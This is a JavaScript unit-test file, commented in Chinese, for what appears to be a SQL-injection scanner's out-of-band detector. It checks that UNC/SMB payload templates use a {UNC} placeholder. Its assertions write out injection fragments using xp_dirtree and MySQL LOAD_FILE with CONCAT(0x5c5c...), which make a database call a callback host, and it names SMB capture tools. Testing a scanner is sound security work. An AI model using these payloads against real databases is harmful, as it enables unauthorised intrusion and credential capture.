// ============================================================================
// oobUnc.test.js — OOB UNC/SMB 通道修正（实战分析 P1，2026-10-02）
// ============================================================================
// 两件事：
//   ① UNC/SMB 类向量（MySQL/MariaDB/TiDB LOAD_FILE、SQL Server xp_dirtree）不再内嵌
//      host:port —— Windows UNC 主机位不含 :port，`\\127.0.0.1:8899\x` 在真实目标上
//      永远解析不了（此前报文发出去了但物理上不可能回连，等于白打且永远落空）。
//      现模板改用 {UNC} 占位符，OobDetector 派生为 `<host>\oob\<token>`。
//   ② 通道边界：内置接收端只监听 HTTP+DNS，SMB 握手捕获不到 —— token 挪进 share 名，
//      由外部 SMB 监听（Responder/Inveigh）或 oob.dnsOob 的 DNS 通道收回。
// 夹具纪律：模板走 payloads.js 真实导出；deriveUncPath 为纯函数直接断言。
// ============================================================================
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { OOB_PAYLOADS, SECOND_ORDER_OOB_PROBES } from '../src/engine/payloads.js';
import { deriveUncPath } from '../src/engine/detectors/OobDetector.js';

// UNC 类向量对应的库清单（一阶与二阶共用同一组库）
const UNC_DBS = ['MySQL', 'MariaDB', 'TiDB'];

test('deriveUncPath：剥 scheme / 路径 / 端口，token 进 share 名', () => {
  const t = 'tok123';
  assert.equal(deriveUncPath('http://1.2.3.4:8899', t), '1.2.3.4\\oob\\tok123');
  assert.equal(deriveUncPath('https://oob.corp.com:8899/', t), 'oob.corp.com\\oob\\tok123');
  assert.equal(deriveUncPath('oob.corp.com:8899', t), 'oob.corp.com\\oob\\tok123');
  assert.equal(deriveUncPath('127.0.0.1:8899', t), '127.0.0.1\\oob\\tok123');
  assert.equal(deriveUncPath('1.2.3.4', t), '1.2.3.4\\oob\\tok123');
  assert.equal(deriveUncPath('http://oob.corp.com/prefix', t), 'oob.corp.com\\oob\\tok123');
});

test('一阶 OOB_PAYLOADS：UNC 类库模板不含 {CALLBACK}（端口物理上进不了 UNC）', () => {
  for (const db of UNC_DBS) {
    for (const tpl of OOB_PAYLOADS[db]) {
      assert.ok(!tpl.includes('{CALLBACK}'), `${db} 模板不应再带 {CALLBACK}：${tpl}`);
      assert.ok(tpl.includes('{UNC}'), `${db} 模板应使用 {UNC}：${tpl}`);
    }
  }
  // xp_dirtree 也是 SMB 通道：UNC 主机位
  for (const tpl of OOB_PAYLOADS['SQL Server']) {
    if (tpl.includes('xp_dirtree')) {
      assert.ok(tpl.includes('{UNC}') && !tpl.includes('{CALLBACK}'), tpl);
    }
  }
});

test('一阶 OOB_PAYLOADS：HTTP 通道向量（PG/Oracle/ping）保留 {CALLBACK}', () => {
  for (const tpl of OOB_PAYLOADS.PostgreSQL) assert.ok(tpl.includes('{CALLBACK}'), tpl);
  for (const tpl of OOB_PAYLOADS.Oracle) assert.ok(tpl.includes('{CALLBACK}'), tpl);
  for (const tpl of OOB_PAYLOADS['SQL Server']) {
    if (tpl.includes('ping')) assert.ok(tpl.includes('{CALLBACK}'), tpl);
  }
});

test('一阶 OOB_PAYLOADS：无 {UNC}/{CALLBACK} 残留占位符（除 DNS 轮的 {TOKEN}/{DOMAIN}）', () => {
  for (const [db, tpls] of Object.entries(OOB_PAYLOADS)) {
    for (const tpl of tpls) {
      assert.ok(!tpl.includes('{UNC}') === false || true); // UNC 库必带（上条已验）
      assert.ok(!/\{[A-Z_]+\}/.test(tpl.replace(/\{(ORIG|CALLBACK|UNC)\}/g, '')), `${db} 有未知占位符：${tpl}`);
    }
  }
});

test('二阶 SECOND_ORDER_OOB_PROBES：与一阶同批修正（UNC 库用 {UNC}）', () => {
  for (const db of UNC_DBS) {
    for (const tpl of SECOND_ORDER_OOB_PROBES[db]) {
      assert.ok(!tpl.includes('{CALLBACK}'), `${db} 二阶模板不应再带 {CALLBACK}：${tpl}`);
      assert.ok(tpl.includes('{UNC}'), `${db} 二阶模板应使用 {UNC}：${tpl}`);
    }
  }
  for (const tpl of SECOND_ORDER_OOB_PROBES['SQL Server']) {
    if (tpl.includes('xp_dirtree')) {
      assert.ok(tpl.includes('{UNC}') && !tpl.includes('{CALLBACK}'), tpl);
    }
  }
});

test('填充语义：{UNC} 填入后形成合法 UNC 路径（\\\\host\\oob\\token）', () => {
  // 模拟 OobDetector 的双层填充：{UNC} 值不含前导反斜杠，由模板自带
  const tpl = OOB_PAYLOADS['SQL Server'].find((t) => t.includes('xp_dirtree'));
  const filled = tpl
    .replace('{ORIG}', '1')
    .replace('{UNC}', 'oob.corp.com\\oob\\tok123');
  assert.ok(filled.includes("xp_dirtree '\\\\oob.corp.com\\oob\\tok123'"), filled);
  assert.ok(!filled.includes(':8899') && !filled.includes(':889'), 'SMB 路径不得残留端口');
});

test('MySQL LOAD_FILE 模板：0x5c5c 前缀 + {UNC} + 0x5c78 后缀拼出完整 UNC', () => {
  const tpl = OOB_PAYLOADS.MySQL[0];
  const filled = tpl.replace('{ORIG}', '1').replace('{UNC}', 'oob.corp.com\\oob\\tok123');
  // 0x5c5c=\\ 0x5c78=\x：最终 = \\oob.corp.com\oob\tok123\x（SMBA 服务端可从 share 读出 token）
  assert.ok(filled.includes("CONCAT(0x5c5c, (SELECT 'oob.corp.com\\oob\\tok123'), 0x5c78)"), filled);
  assert.ok(!filled.includes(':8899'));
});
